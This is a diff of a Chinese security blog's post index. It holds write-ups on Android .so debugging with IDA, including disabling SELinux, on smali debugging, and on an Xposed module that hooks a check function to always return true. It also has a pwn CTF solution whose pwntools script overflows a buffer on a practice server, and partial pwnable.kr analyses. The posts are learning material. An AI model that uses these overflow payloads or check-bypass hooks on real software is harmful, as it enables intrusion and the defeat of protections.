-<h3 id="运行android-server"><a href="#运行android-server" class="headerlink" title="运行android_server"></a>运行android_server</h3><p>运行命令</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adb shell                                 &#x2F;&#x2F;进入手机的shell</span><br><span class="line">cd &#x2F;data&#x2F;local&#x2F;tmp                        &#x2F;&#x2F;进入存放的目录</span><br><span class="line">ls -al                                    &#x2F;&#x2F;查看目录下所有文件及属性</span><br><span class="line">chmod 777 android_server                  &#x2F;&#x2F;修改权限</span><br><span class="line">.&#x2F;android_server                          &#x2F;&#x2F;运行</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180330/p3.png" alt=""> </p>
-<blockquote>
-<p>过程中可能会有权限限制，建议使用root权限执行以上命令</p>
-</blockquote>
-<h3 id="进行端口转发"><a href="#进行端口转发" class="headerlink" title="进行端口转发"></a>进行端口转发</h3><blockquote>
-<p>新开一个cmd窗口。执行命令adb forward tcp:23946  tcp:23946</p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180330/p4.png" alt=""> </p>
-<h3 id="使用IDA进行附加"><a href="#使用IDA进行附加" class="headerlink" title="使用IDA进行附加"></a>使用IDA进行附加</h3><blockquote>
-<p>首先在手机中打开程序，这样附加时就会有这个进程，不然找不到。<br>启动IDA Pro程序，点击菜单项Debugger—&gt;Attach—&gt;Remote ArmLinux/Android debugger,打开程序设置对话框 </p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180330/p5.png" alt=""> </p>
-<blockquote>
-<p>但这时可能会弹出一个错误对话框。</p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180330/p6.png" alt=""> </p>
-<blockquote>
-<p>这时需要关闭selinux安全机制(需要root权限)。在adb中执行</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">setenforce 0</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180330/p7.png" alt=""> </p>
-<blockquote>
-<p>关闭后，我们重新附加进程。这时会弹出进程列表。</p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180330/p8.png" alt=""> </p>
-<blockquote>
-<p>这里要注意，此时我们要调试的so文件还没有加载到进程中，我们要先在手机界面点击，让so加载到程序中，这样调试时就会有可以找到so文件。<br>这样IDA会出现各种界面，我们留意左上角的那个模块框。放大找到我们要调试的so文件。</p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180330/p10.png" alt=""> </p>
-<blockquote>
-<p>双击进入，找到check函数</p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180330/p11.png" alt=""> </p>
-<blockquote>
-<p>点击进入汇编代码，在开始处单击，这样就下好一个断点，程序运行到这里就会停下。</p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180330/p12.png" alt=""> </p>
-<h3 id="开始运行调试"><a href="#开始运行调试" class="headerlink" title="开始运行调试"></a>开始运行调试</h3><blockquote>
-<p>此时手机的状态是挂起，屏幕什么的都操作不了，点击IDA左上角的绿色小箭头，程序就可以运行，就能在手机中输入字符。</p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180330/p14.png" alt=""> </p>
-<blockquote>
-<p>手机中已经可以输入字符了，输入后就可以单击check，这时程序就会断下</p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180330/p15.png" alt=""> </p>
-<blockquote>
-<p>IDA中显示</p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180330/p16.png" alt=""> </p>
-<blockquote>
-<p>接下来就可以调试了。</p>
-</blockquote>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote>
-<p>对于这次so调试，踩了很多坑，模拟器不能调arm的so，这个是收获最大的了。</p>
-</blockquote>
-<p>个人拙见，错误之处请大佬指正，欢迎留言交流。</p>
+    <title>PWN学习—[XMAN] level0</title>
+    <url>/2021/03/03/PWN%E5%AD%A6%E4%B9%A0%E2%80%94%5BXMAN%5D%20level0/</url>
+    <content><![CDATA[<hr>
+<p>title:   PWN学习—[XMAN] level0<br>date: 2021-3-1 00:55:00<br>tags: </p>
+<pre><code>- CTF
+- pwn</code></pre><p>  categories: </p>
+<pre><code>- 其他</code></pre><h2 id="一-前言"><a href="#一-前言" class="headerlink" title="一.前言"></a>一.前言</h2><p>练习平台：<a href="https://www.jarvisoj.com/challenges" target="_blank" rel="noopener">https://www.jarvisoj.com/challenges</a></p>
+<p>题目：[ XMAN ] level 0</p>
+<p><img src="F:%5CPWN%5Cjarvisoj%5Cphoto%5Cxman-level0%5C0.png" alt="image-20210302230037626"></p>
+<p><img src="F:%5CPWN%5Cjarvisoj%5Cphoto%5Cxman-level0%5C1.png" alt="image-20210302230145529"></p>
+<h2 id="二-分析"><a href="#二-分析" class="headerlink" title="二.分析"></a>二.分析</h2><h3 id="2-1-IDA查看"><a href="#2-1-IDA查看" class="headerlink" title="2.1 IDA查看"></a>2.1 IDA查看</h3><p><img src="C:%5CUsers%5Czzw%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210302230420875.png" alt="image-20210302230420875"></p>
+<p><img src="F:%5CPWN%5Cjarvisoj%5Cphoto%5Cxman-level0%5C2.png" alt="image-20210302230748270"></p>
+<p>这里要注意漏洞函数中read的第一个参数，这里表示的是标准输入，很明显这里存在一个栈溢出。</p>
+<p>查看是否有system（）、”/bin/sh”字符。</p>
+<p><img src="F:%5CPWN%5Cjarvisoj%5Cphoto%5Cxman-level0%5C3.png" alt="image-20210302231236897"></p>
+<p>现成的system(“bin/sh”)</p>
+<h3 id="2-2-GDB调试"><a href="#2-2-GDB调试" class="headerlink" title="2.2 GDB调试"></a>2.2 GDB调试</h3><h4 id="2-2-1-查看安全机制"><a href="#2-2-1-查看安全机制" class="headerlink" title="2.2.1 查看安全机制"></a>2.2.1 查看安全机制</h4><p><img src="F:%5CPWN%5Cjarvisoj%5Cphoto%5Cxman-level0%5C4.png" alt="image-20210302231527158"></p>
+<p>堆栈不可执行开启。</p>
+<h4 id="2-2-2-缓冲区大小调试"><a href="#2-2-2-缓冲区大小调试" class="headerlink" title="2.2.2  缓冲区大小调试"></a>2.2.2  缓冲区大小调试</h4><p>gdb中使用命令生成若干字符</p>
+<p><img src="F:%5CPWN%5Cjarvisoj%5Cphoto%5Cxman-level0%5C5.png" alt="image-20210302233927577"></p>
+<p>命令：pattern create 200 </p>
+<p> <img src="F:%5CPWN%5Cjarvisoj%5Cphoto%5Cxman-level0%5C6.png" alt="image-20210302233429253"></p>
+<p>然后将生成的这段字符，在程序需要输入的地方输入</p>
+<p><img src="F:%5CPWN%5Cjarvisoj%5Cphoto%5Cxman-level0%5C7.png" alt="image-20210302233520257"></p>
+<p>查看rbp,数据</p>
+<p><img src="F:%5CPWN%5Cjarvisoj%5Cphoto%5Cxman-level0%5C8.png" alt="image-20210302233552682"></p>
+<p>定位缓冲区大小</p>
+<p><img src="F:%5CPWN%5Cjarvisoj%5Cphoto%5Cxman-level0%5C9.png" alt="image-20210302233633943"></p>
+<h3 id="2-2-3-编写poc"><a href="#2-2-3-编写poc" class="headerlink" title="2.2.3 编写poc"></a>2.2.3 编写poc</h3><p><img src="F:%5CPWN%5Cjarvisoj%5Cphoto%5Cxman-level0%5C10.png" alt="image-20210302234617330"></p>
+<p>payload+= 128 *  ‘a’      //缓冲区的大小</p>
+<p>payload+= 8 *  ‘a’      //ebp   64位8个字节</p>
+<p>payload+= p64(0x400596)     //覆盖返回地址的位置</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">pro&#x3D;remote(&#39;pwn2.jarvisoj.com&#39;,9881)</span><br><span class="line">data&#x3D;pro.recv(100).decode()</span><br><span class="line">print(data) </span><br><span class="line">#payload&#x3D;flat([(128+8)*&#39;a&#39;,p64(0x400596)])        ##  python2.7</span><br><span class="line">payload&#x3D;(128)*&#39;a&#39;+p64(0xdeadbeef)+p64(0x400596)   ##  python3.6</span><br><span class="line">pro.send(payload)</span><br><span class="line">pro.interactive()</span><br><span class="line">pro.close()</span><br></pre></td></tr></table></figure>
+
+<p>结果：</p>
+<p><img src="F:%5CPWN%5Cjarvisoj%5Cphoto%5Cxman-level0%5C11.png" alt="image-20210302235321824"></p>
+<p>flag</p>
+<p>CTF{713ca3944e92180e0ef03171981dcd41}</p>
 ]]></content>
-      <categories>
-        <category>逆向技术学习</category>
-      </categories>
-      <tags>
-        <tag>IDA动态</tag>
-        <tag>so调试</tag>
-      </tags>
   </entry>
   <entry>
-    <title>Android Studio+夜神模拟器 动态调试APK</title>
-    <url>/2018/03/03/Android%20Studio+%E5%A4%9C%E7%A5%9E%E6%A8%A1%E6%8B%9F%E5%99%A8%20%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95APK/</url>
-    <content><![CDATA[<h2 id="1-smali文件格式"><a href="#1-smali文件格式" class="headerlink" title="1 smali文件格式"></a>1 smali文件格式</h2><table>
-<thead>
-<tr>
-<th align="left">头部定义</th>
-<th align="center">域定义</th>
-<th align="right">函数定义</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">.class</td>
-<td align="center">.field public</td>
-<td align="right">.method</td>
-</tr>
-<tr>
-<td align="left">.super</td>
-<td align="center">.field static</td>
-<td align="right">instruction</td>
-</tr>
-<tr>
-<td align="left">.source</td>
-<td align="center">.field private</td>
-<td align="right">.endmethod</td>
-</tr>
-</tbody></table>
+    <title>Xposed框架使用初探(一)</title>
+    <url>/2018/03/15/Xposed%E6%A1%86%E6%9E%B6%E4%BD%BF%E7%94%A8%E5%88%9D%E6%8E%A2(%E4%B8%80)/</url>
+    <content><![CDATA[<h2 id="Hook简介"><a href="#Hook简介" class="headerlink" title="Hook简介"></a>Hook简介</h2><blockquote>
+<p>Hook英文翻译即为钩子。windows下的Hook是一种消息处理机制。每当特定的消息发出，在没有到达目的窗口前，钩子程序就先捕获该消息，即钩子函数先得到控制权，这时钩子函数就可以对消息进行加工处理。它其实是一个处理消息的程序段。当然在安卓系统中也有Hook技术，和windows下的Hook类似，也是在事件传送到终点前截获并监控事件的传输，并对所钩上的事件作出相应的处理。</p>
+</blockquote>
 <a id="more"></a>
-
-<h2 id="2-准备"><a href="#2-准备" class="headerlink" title="2 准备"></a>2 准备</h2><p>Android studio（简称AS）<br>smalidea-0.05.zip(插件)<br>android killer(修改smali文件)<br>夜神模拟器<br>实验程序 crakme02.apk</p>
-<h3 id="2-1-修改AndroidManifest-xml"><a href="#2-1-修改AndroidManifest-xml" class="headerlink" title="2.1 修改AndroidManifest.xml"></a>2.1 修改AndroidManifest.xml</h3><p>使用apktool.jar反编译apk。命令：java -jar apktool.jar d -f xxx.apk<br>会生成xxx文件夹。动态调试需要在AndroidManifest.xml添加可调试属性android:debuggable=”true”<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p2-171201/p1.jpg" alt="xml表"><br>修改后同样使用apktool.jar进行回编译。命令：java -jar apktool.jar b -f xxx.apk（未签名）<br>打包后的apk并没有签名。可以使用jdk自带的keytool生成keystore,然后使用jarsigner进行签名。<br>以上过程可以使用一些工具来进行修改。反编译后的xxx文件夹是加载到android studio中的源代码。回编译的apk是安装在夜神模拟器中的。</p>
-<h3 id="2-2-AS安装smalidea插件"><a href="#2-2-AS安装smalidea插件" class="headerlink" title="2.2 AS安装smalidea插件"></a>2.2 AS安装smalidea插件</h3><p>这里的smalidea-0.05.zip插件是下载好的。<br>依次点击File–&gt;setting–&gt;Plugins点击<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p2-171201/p2.jpg" alt="安装选取"><br>从磁盘安装后点击apply–&gt;ok–&gt;重启即可</p>
-<h3 id="2-3-夜神模拟器连接DDMS"><a href="#2-3-夜神模拟器连接DDMS" class="headerlink" title="2.3 夜神模拟器连接DDMS"></a>2.3 夜神模拟器连接DDMS</h3><ol>
-<li>启动模拟器</li>
-<li>cd进入到夜神安装bin目录下，执行命令nox_adb.exe connect 127.0.0.1:62001</li>
-<li>如果命令执行错误。可能是nox_adb.exe版本不对，下载相应版本的替换即可。<br>我这里是配合了环境变量，并将nox_adb.exe connect 127.0.0.1:62001命令做成一个bat。直接运行图方便。<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p2-171201/p4.jpg" alt="启动模拟器"><br><strong>模拟器启动后安装回编译并签名的apk</strong><h2 id="3-调试"><a href="#3-调试" class="headerlink" title="3 调试"></a>3 调试</h2><h3 id="3-1-导入源码"><a href="#3-1-导入源码" class="headerlink" title="3.1 导入源码"></a>3.1 导入源码</h3>将反编译的xxx文件夹加载到AS，类似加载一个安卓工程（导入….）界面如下:<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p2-171201/p5.jpg" alt="源码导入"><h3 id="3-2-设置远程调试"><a href="#3-2-设置远程调试" class="headerlink" title="3.2 设置远程调试"></a>3.2 设置远程调试</h3>打开AS，依次点击Run–&gt;edit configurations如图示：<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p2-171201/p6.jpg" alt="配置远程调试"><br>点击+号，添加remote配置。<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p2-171201/p7.jpg" alt="添加远程"><br>项目名字随便填，其余地方已用箭头标记<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p2-171201/p8.jpg" alt="配置端口"><h3 id="3-3-打开-Android-device-Monitor"><a href="#3-3-打开-Android-device-Monitor" class="headerlink" title="3.3 打开 Android device Monitor"></a>3.3 打开 Android device Monitor</h3><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p2-171201/p9.jpg" alt="打开ddms"><br>因为模拟器上没有运行什么应用，所以列表中并没有什么应用显示<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p2-171201/p10.jpg" alt="程序列表显示"><h3 id="3-4-下断点并开启调试"><a href="#3-4-下断点并开启调试" class="headerlink" title="3.4 下断点并开启调试"></a>3.4 下断点并开启调试</h3>这是一个检测输入是否正确的apk，所以断点就下到checkSN函数处，在代码最左边单击即可。<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p2-171201/p11.jpg" alt="下调试断点"><br>打开cmd  输入 <code>adb shell am start -D -n com.droider.crackme0201/.MainActivity（包名/启动主activity）</code><br>然后模拟器会显示等待调试的弹出框<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p2-171201/p12.jpg" alt="启动调试"><br>接下来就是在AS中启动程序了Run—&gt;debug<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p2-171201/p13.jpg" alt="运行程序"><br>DDMS中也会显示调试程序包名<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p2-171201/p14.jpg" alt="ddms显示"><br>可以看到模拟器已经在程序中启动，而且ddms中红色的甲壳虫也变绿。<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p2-171201/p15.png" alt="模拟器显示"><br>接下来我们随意输入，将程序停在所下断点处。<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p2-171201/p16.png" alt="断点处"><br>可以看到断点已经停下。后续单步调试，查看变量等操作在这里就不介绍。<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/p2-171201/p17.png" alt="变量显示"><br>个人总结过程，仅供参考。</li>
+<h2 id="xposed框架"><a href="#xposed框架" class="headerlink" title="xposed框架"></a>xposed框架</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><blockquote>
+<p>Xposed框架是一款对安卓平台的HOOK框架，可以在不修改APK的情况下修改程序的框架服务。通过替换/system/bin/app_process程序控制Zygote进程，从而使app_process在启动过程中加载XposedBridge.jar这个jar包。Zygote进程在启动过程中，会创建一个Dalvik虚拟机实例，还会把java运行时库加载到进程中来，以及注册一些Android核心类的JNI方法来前面创建的Dalvik虚拟机实例中去，应用程序进程会与Zygote一起共享Java运行时库。这就是XposedBridge.jar包可以加载的原因。</p>
+</blockquote>
+<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><blockquote>
+<p>Xposed框架本质只是一个apk应用，可安装到手机。相应模块(Hook代码)就需要我们去编写，模块也是apk文件。</p>
+</blockquote>
+<ol>
+<li><p>手机必须是具有Root权限的。Root是有一定风险的。所以这里使用的是模拟器。</p>
+</li>
+<li><p>实验设备：夜神模拟器+Android4.4.2+XposedInstall.apk(v2.7)+XposedBridge.jar-54。</p>
+</li>
+<li><p>Xposed框架安装效果如下：<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/photo-180315/p1.png" alt="效果图-1"></p>
+<h2 id="Xposed使用示例"><a href="#Xposed使用示例" class="headerlink" title="Xposed使用示例"></a>Xposed使用示例</h2><h3 id="需要被Hook的程序"><a href="#需要被Hook的程序" class="headerlink" title="需要被Hook的程序"></a>需要被Hook的程序</h3><blockquote>
+<p>程序界面如下</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/photo-180315/p2.png" alt="界面-2"></p>
+<blockquote>
+<p>源代码如下:</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/photo-180315/p3.jpg" alt="源代码-3"></p>
+<blockquote>
+<p>源代码逻辑很简单，输入一段字符串，然后在compare函数中比较。根据返回值判断输入是否正确。因为这只是做一个示例，compare函数中直接用了equals函数来比较。在代码编程中这是很愚蠢的做法，强烈不建议这种写法。<br>如果想让程序返回正确的值，只要将compare的返回值为true即可。我们这里Hook的就是compare函数，不管输入任意字符，都会显示返回成功。</p>
+</blockquote>
+<h3 id="Hook关键函数介绍"><a href="#Hook关键函数介绍" class="headerlink" title="Hook关键函数介绍"></a>Hook关键函数介绍</h3><blockquote>
+<p>IXposedHookLoadPackage类：加载回调接口，在Xposed入口类继承，实现handleLoadPackage方法。<br>handleLoadPackage：这个方法用于在加载应用程序的包的时候执行用户的操作。<br>findAndHookMethod(String className, ClassLoader classLoader, String methodName, Object… parameterTypesAndCallback) hook一个类中的方法<br>参数:<br>className: 要hook的方法的所在类<br>classloader: 要hook的包的classLoader，一般都写loadPackageParam.classLoader<br>methodName: 要hook的方法<br>parameterTypesAndCallback: 方法的参数和监听器。</p>
+</blockquote>
+<h3 id="导入lib文件"><a href="#导入lib文件" class="headerlink" title="导入lib文件"></a>导入lib文件</h3><blockquote>
+<p>新建安卓项目，这个应该很简单。需要导入jar文件-XposedBridgeApi-54.jar。</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/photo-180315/p4.png" alt="结构图-4"></p>
+</li>
 </ol>
+<blockquote>
+<p>新建文件夹，命名为lib,然后将XposedBridgeApi-54.jar复制过来。右键Add as library。这样就能看到里面的类了。</p>
+</blockquote>
+<p> <img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/photo-180315/p5.png" alt="结构图-5"></p>
+<blockquote>
+<p>然后修改build.gradle文件，将compile改为provided。</p>
+</blockquote>
+<p> <img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/photo-180315/p6.jpg" alt="结构图-6"></p>
+<h3 id="AndroidManifest-xml文件修改"><a href="#AndroidManifest-xml文件修改" class="headerlink" title="AndroidManifest.xml文件修改"></a>AndroidManifest.xml文件修改</h3><p>需要在配置文件中添加一些属性。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;application&gt;</span><br><span class="line">        &lt;meta-data android:name&#x3D;&quot;xposedmodule&quot; android:value&#x3D;&quot;true&quot;&#x2F;&gt;</span><br><span class="line">        &lt;meta-data android:name&#x3D;&quot;xposeddescription&quot; android:value&#x3D;&quot;模块第一次测试&quot;&#x2F;&gt;</span><br><span class="line">        &lt;meta-data android:name&#x3D;&quot;xposedminversion&quot; android:value&#x3D;&quot;54&quot;&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;application&gt;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>xposedmodule:判断是否是xposed模块，xposed根据这个来判断是否是模块。<br>xposeddescription：模块描述，会显示在xposed框架模块列表中。<br>xposedminversion：最低xposed版本号，lib文件名可知。</p>
+</blockquote>
+<h3 id="入口类编写"><a href="#入口类编写" class="headerlink" title="入口类编写"></a>入口类编写</h3><blockquote>
+<p>创建一个类，实现IXposedHookLoadPackage借口，重写handLoadPackage方法，这里创建了一个xposedmain类。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class xposedmain implements IXposedHookLoadPackage &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void handleLoadPackage(XC_LoadPackage.LoadPackageParam Param) throws Throwable &#123;</span><br><span class="line">        if(Param.packageName.equals(&quot;com.example.zzwbi.check&quot;))&#x2F;&#x2F;匹配包名</span><br><span class="line">        &#123;</span><br><span class="line">            XposedBridge.log(&quot;Loaded APP:&quot;+Param.packageName);&#x2F;&#x2F;XposedBridge.log相当于日志输出。</span><br><span class="line">            try &#123;</span><br><span class="line">                findAndHookMethod(&quot;com.example.zzwbi.check.MainActivity&quot;, Param.classLoader, &quot;compare&quot;, String.class, new get_True());</span><br><span class="line">                                  &#x2F;&#x2F;类名，一般都写Param.classLoader,方法名，参数...,hook的方法</span><br><span class="line">            &#125; catch (Exception e) &#123;</span><br><span class="line">                XposedBridge.log(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class get_True extends XC_MethodHook &#123;</span><br><span class="line">    protected void beforeHookedMethod(XC_MethodHook.MethodHookParam param) throws Throwable &#123;</span><br><span class="line">        XposedBridge.log(&quot;beforeHookedMethod userName:&quot; + param.args[0]);</span><br><span class="line">        &#x2F;&#x2F;hook前的一些操作</span><br><span class="line">    &#125;</span><br><span class="line">    protected void afterHookedMethod(XC_MethodHook.MethodHookParam args) throws Throwable &#123;</span><br><span class="line">        &#x2F;&#x2F;hook后的一些操作</span><br><span class="line">        args.setResult(true);</span><br><span class="line">        XposedBridge.log(&quot;使返回值为true&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="设置启动入口"><a href="#设置启动入口" class="headerlink" title="设置启动入口"></a>设置启动入口</h3><blockquote>
+<p>新建assets文件夹,在里面新建文件名为xposed_init,写入你自己创建的xposedmain类包名。</p>
+</blockquote>
+<p> <img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/photo-180315/p7.png" alt="启动入口-7"></p>
+<blockquote>
+<p>包名+类名</p>
+</blockquote>
+<p> <img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/photo-180315/p8.png" alt="示意图-8"></p>
+<h3 id="安装激活插件"><a href="#安装激活插件" class="headerlink" title="安装激活插件"></a>安装激活插件</h3><blockquote>
+<p>将apk安装到模拟器上，重启后即可看到插件效果。</p>
+</blockquote>
+<p> <img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/photo-180315/p9.png" alt="启用插件-9"></p>
+<blockquote>
+<p>下面看下hook效果</p>
+</blockquote>
+<p> <img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/photo-180315/p10.png" alt="Hook成功-10"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote>
+<p>这只是对于Xposed学习的一次小尝试。对于其Hook还有很多地方要学习。例如静态field变量,隐藏函数，内部类，匿名内部类，构造函数的Hook都要继续研究。</p>
+</blockquote>
+<p>####参考链接:<br><a href="http://blog.csdn.net/jiabailong/article/details/52368002" target="_blank" rel="noopener">http://blog.csdn.net/jiabailong/article/details/52368002</a><br> <a href="http://blog.csdn.net/wxyyxc1992/article/details/17320911" target="_blank" rel="noopener">http://blog.csdn.net/wxyyxc1992/article/details/17320911</a><br><a href="http://www.freebuf.com/articles/terminal/114910.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/terminal/114910.html</a></p>
 ]]></content>
       <categories>
         <category>逆向技术学习</category>
       </categories>
       <tags>
         <tag>Android</tag>
-        <tag>夜神模拟器</tag>
+        <tag>Xposed</tag>
       </tags>
   </entry>
   <entry>
@@ -1076,109 +1230,47 @@
       </tags>
   </entry>
   <entry>
-    <title>Pwnable.kr题解之Fd</title>
-    <url>/2018/03/26/Pwnable.kr%E9%A2%98%E8%A7%A3%E4%B9%8BFd/</url>
+    <title>Pwnable.kr题解之col</title>
+    <url>/2018/03/31/Pwnable.kr%E9%A2%98%E8%A7%A3%E4%B9%8Bcol/</url>
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
-<p>作为一名专业打酱油选手参加了强网杯，结果是相当失败。大部分题目都是Pwn题，有心无力，只叹自己学艺不精，所以准备好好学习Pwn。准备长期和<a href="http://www.pwnable.kr" target="_blank" rel="noopener">pwnable.kr</a>死磕。接下来正式开始个人的Pwn之旅。</p>
+<p>这是第二道Pwn练习collision。链接pwnable.kr,下面简单讲解下分析过程。</p>
+</blockquote>
+<h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><blockquote>
+<p>前面的一些下载链接操作这里就不介绍了。直接从linux系统开始调试。<br>首先运行下程序，对程序整体有个把握。</p>
 </blockquote>
 <a id="more"></a>
-<h2 id="题目介绍"><a href="#题目介绍" class="headerlink" title="题目介绍"></a>题目介绍</h2><blockquote>
-<p>在Pwnable.kr网站注册登陆后，就可以做题了。这里是第一题Fd,显示如下：</p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180326/p1.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180331/p1.png" alt=""></p>
 <blockquote>
-<p><a href="https://youtu.be/971eZhMHQQw" target="_blank" rel="noopener">https://youtu.be/971eZhMHQQw</a>是关于这道题的视频讲解，不过是在youtube上，翻墙了才能看，不过国内也有很多题解，足够了。<br>下面是ssh的链接地址。在linux系统中用这个就可以链接，密码是guest。链接效果如下：</p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180326/p2.png" alt=""></p>
-<blockquote>
-<p>不过我们想要下载源码怎么办呢？这里推荐一款连接工具：winscp,百度一下就可以下载。软件界面如下：</p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180326/p3.png" alt=""></p>
-<blockquote>
-<p>登录成功界面：</p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180326/p4.png" alt=""></p>
-<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><h3 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h3><blockquote>
-<p>经过上面的过程我们可以获得elf文件和程序源码。但在比赛中，并不会提供程序源码，所以也不去看。先运行下程序，看看是怎么样的。将程序拷贝到linux中，先不使用ssh连接，时间久了会卡死。</p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180326/p5.png" alt=""></p>
-<blockquote>
-<p>由于个人习惯，会使用file命令查看文件的有关信息，看是32/64位环境运行。然后就是添加权限运行。第一次运行提示缺少参数，第二次运行添加参数，然后报错。接下来就是分析汇编代码。</p>
-</blockquote>
-<h3 id="汇编代码分析"><a href="#汇编代码分析" class="headerlink" title="汇编代码分析"></a>汇编代码分析</h3><blockquote>
-<p>为了提高自己阅读汇编代码的能力，先不直接使用IDA。使用命令<br>objdump -d fd<br>查看代码。反汇编代码如下(仅main部分)：</p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180326/p6.png" alt=""><br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180326/p7.png" alt=""></p>
-<blockquote>
-<p>简单解释下汇编代码的含义：</p>
+<p>可以看到程序运行需要一个参数，而且要20个字节</p>
 </blockquote>
 <blockquote>
-<p>8048494:          push   %ebp<br>8048495:      mov    %esp,%ebp<br>8048497:    push   %edi<br>8048498:    push   %esi//把ebp压入栈中,保存ebp指向目前的栈顶，把edi和esi压入栈，为了保存寄存器。<br>8048499:and    $0xfffffff0,%esp<br>804849c: sub    $0x20,%esp //开辟栈空间</p>
+<p>再使用命令将程序反编译，查看主要函数与代码。</p>
 </blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">objdump -d col</span><br></pre></td></tr></table></figure>
 <blockquote>
-<p>804849f: cmpl   $0x1,0x8$(%ebp)<br> 80484a3: jg     80484bb &lt;main+0x27&gt;<br> //0x8(%ebp)保存着输入的第一个参数，如果没有参数则不跳转。</p>
+<p>观察发现有一个check_password函数，观察貌似是运算相加，然后比较，</p>
 </blockquote>
+<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180331/p2.png" alt=""></p>
 <blockquote>
-<p>80484a5:    movl   $0x8048630, (%esp)<br> 80484ac:   call   8048380 &lt;puts@plt&gt;<br> 80484b1:   mov    $0x0, %eax<br> 80484b6:   jmp    8048559 &lt;main+0xc5&gt;  //当没有参数时的执行流，输出字符串然后跳转到最后。</p>
+<p>接下来请出调试神器—GDB，在check_password下断点。</p>
 </blockquote>
+<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180331/p3.png" alt=""></p>
 <blockquote>
